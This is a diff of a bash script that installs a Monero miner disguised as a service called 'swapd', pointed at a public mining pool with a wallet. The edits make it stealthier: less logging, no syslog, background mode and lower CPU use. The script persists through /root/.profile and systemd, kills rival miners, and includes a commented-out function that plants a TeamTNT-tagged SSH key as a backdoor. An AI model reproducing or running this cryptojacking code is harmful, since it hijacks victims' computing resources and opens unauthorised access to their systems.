@@ -273,36 +273,36 @@ if (test $? -ne 0); then
     echo "WARNING: Advanced version of $MOHOME/xmrig was removed by antivirus (or some other problem)"
   fi
 
-  echo "[*] Looking for the latest version of Monero miner"
+  #echo "[*] Looking for the latest version of Monero miner"
   #LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
-  LATEST_XMRIG_LINUX_RELEASE=$MOxmrigSTOCK
+  #LATEST_XMRIG_LINUX_RELEASE=$MOxmrigSTOCK
 
-   echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
-  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
-    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
-    exit 1
-  fi
+   #echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
+  #if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
+    #echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
+    #exit 1
+  #fi
 
-  echo "[*] Unpacking /tmp/xmrig.tar.gz to $MOHOME/"
-  if ! tar xf /tmp/xmrig.tar.gz -C $MOHOME/ --strip=1; then
-    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $MOHOME/ directory"
-  fi
+  #echo "[*] Unpacking /tmp/xmrig.tar.gz to $MOHOME/"
+  #if ! tar xf /tmp/xmrig.tar.gz -C $MOHOME/ --strip=1; then
+    #echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $MOHOME/ directory"
+  #fi
   rm /tmp/xmrig.tar.gz
 
-  echo "[*] Checking if stock version is OKAY!"
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $MOHOME/swapd.pid
-  $MOHOME/swapd --help >/dev/null
-  if (test $? -ne 0); then 
-    if [ -f $MOHOME/swapd ]; then
-      echo "ERROR: Stock version of $MOHOME/swapd is not functional too"
-    else 
-      echo "ERROR: Stock version of $MOHOME/swapd was removed by antivirus too"
-    fi
+  #echo "[*] Checking if stock version is OKAY!"
+  #sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $MOHOME/swapd.pid
+  #$MOHOME/swapd --help >/dev/null
+  #if (test $? -ne 0); then 
+    #if [ -f $MOHOME/swapd ]; then
+      #echo "ERROR: Stock version of $MOHOME/swapd is not functional too"
+    #else 
+      #echo "ERROR: Stock version of $MOHOME/swapd was removed by antivirus too"
+    #fi
 #    exit 1
-  fi
-fi
+  #fi
+#fi
 
-echo "[*] $MOHOME/swapd is OK"
+#echo "[*] $MOHOME/swapd is OK"
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -318,16 +318,16 @@ fi
 sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $MOHOME/swapd.pid
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $MOHOME/swapd.pid
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $MOHOME/swapd.pid
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $MOHOME/swapd.pid
-sed -i 's#"log-file": *null,#"log-file": "'$MOHOME/swapd.log'",#' $MOHOME/swapd.pid
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $MOHOME/swapd.pid
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 75,/' $MOHOME/swapd.pid
+#sed -i 's#"log-file": *null,#"log-file": "'$MOHOME/swapd.log'",#' $MOHOME/swapd.pid
+sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $MOHOME/swapd.pid
 
-rm $HOME/.swapd/config.json
+#rm $HOME/.swapd/config.json
 
-cat $HOME/.swapd/swapd.pid <<EOL
+#cat $HOME/.swapd/swapd.pid <<EOL
 #{
 #    "autosave": true,
-#    "background": false,
+#    "background": true,
 #    "cpu": true,
 #    "opencl": true,
 #    "cuda": true,
@@ -357,10 +357,12 @@ cat $HOME/.swapd/swapd.pid <<EOL
 killall xmrig
 
 echo "[*] Creating $MOHOME/swapd.sh script"
+
 cat >$MOHOME/swapd.sh <<EOL
 #!/bin/bash
 if ! pidof swapd >/dev/null; then
-  nice $MOHOME/swapd \$*
+  #nice $MOHOME/swapd \$*
+  nice $MOHOME/swapd --config swapd.pid
 else
   echo "Monero miner is already running in the background. Refusing to run another one."
   echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
@@ -373,12 +375,12 @@ chmod +x $MOHOME/swapd.sh
 if ! sudo -n true 2>/dev/null; then
   if ! grep $MOHOME/swapd.sh /root/.profile >/dev/null; then
     echo "[*] Adding $MOHOME/swapd.sh script to /root/.profile"
-    echo "$MOHOME/swapd.sh --config=$MOHOME/config_background.json >/dev/null 2>&1" >>/root/.profile
+    echo "$MOHOME/swapd.sh --config=$MOHOME/swapd.pid >/dev/null 2>&1" >>/root/.profile
   else 
     echo "Looks like $MOHOME/swapd.sh script is already in the /root/.profile"
   fi
   echo "[*] Running swapd service in the background (see logs in $MOHOME/swapd.log file)"
-  /bin/bash $MOHOME/swapd.sh --config=$MOHOME/config_background.json >/dev/null 2>&1
+  /bin/bash $MOHOME/swapd.sh --config=$MOHOME/swapd.pid >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
@@ -389,7 +391,7 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    /bin/bash $MOHOME/swapd.sh --config=$MOHOME/config_background.json >/dev/null 2>&1
+    /bin/bash $MOHOME/swapd.sh --config=$MOHOME/swapd.pid >/dev/null 2>&1
 
   else
 
@@ -417,9 +419,6 @@ EOL
     echo "To see swapd service logs run \"sudo journalctl -u swapd -f\" command"
   fi
 fi
-
-service swapd status
-systemctl status swapd
 
 #function makesshaxx(){
 #RSAKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/g11TQs97a6DPQbrbIGvbNzbRVJgXw1OLrLFJDWFc1t+52tVFvkLHjWikS/X2nvyjW826YjbglNVUdkV3hzG+ApvvaLn+v20SzI5bs48Yyv+APczVp0LO2e6o1WLHyRNwYMZEiGI30lGIuUmBleH1XXeR+KBdMr0nqN0V18jmGtxYEBM9gwhD8VSCDFjLA5vE0uciqpn58oOSS3la+25fQyrFEN/S1orI2arh0qsfdrWIQ6ftLgtBW4F52maKMjpBXi/MugMMqbog6S4Sm3S6Pnh79clL7A1ghNnt3/pAUOxXKlWqopwueBFfGF56UExYn5h4bpyF8gd9ZGdUJJxBgLtG80BgLDa+ZT8deJ4K4QMKbwkS2PjlHzf6GzF8BR2UNmoaejFzcHAalNhKxhdybvfDR9djCc5c2Tjt+2HQIUsHdDWknbcUcvjQpJBRc1BRlNBX1y0M5oaPSfgRInRv75Dw4TfYazM1QFWJCKs+8tvQJncz5dHeAaaNfXQKk3EVzS5WRpy2wYsTjU0kZrKiWDTu6PDS2uwY8p7SsSdGfC1xYNonCEeHCuDNGOYVetxjy3IS7kWyXl5mFZmZVjSTub7/T6k6KwrlzwmCVG46Y2FFyH1Vpx8dWKUkB2fQS3pBCD4jw1GdbsmfaM0YQBthIh8h9jN1Uieo++IMymiAdw== nginx@teamtnt.red"
